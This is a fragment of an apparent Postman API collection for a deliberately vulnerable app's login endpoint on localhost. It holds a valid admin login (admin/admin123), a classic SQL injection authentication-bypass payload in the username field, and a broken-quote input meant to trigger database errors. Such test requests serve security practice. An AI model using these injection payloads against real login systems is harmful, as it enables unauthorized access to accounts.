      "name": "Auth (Vulnerable)",
      "item": [
        {
          "name": "Login — valid credentials",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"username\": \"admin\",\n  \"password\": \"admin123\"\n}"
            },
            "url": "http://localhost:3000/api/auth/login"
          }
        },
        {
          "name": "Login — auth bypass (SQLi)",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"username\": \"' OR '1'='1' -- \",\n  \"password\": \"anything\"\n}"
            },
            "url": "http://localhost:3000/api/auth/login"
          }
        },
        {
          "name": "Login — error-based (broken quote)",
          "request": {
            "method": "POST",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"username\": \"admin'\",\n  \"password\": \"test\"\n}"
            },
            "url": "http://localhost:3000/api/auth/login"
          }
        }
      ]
    },
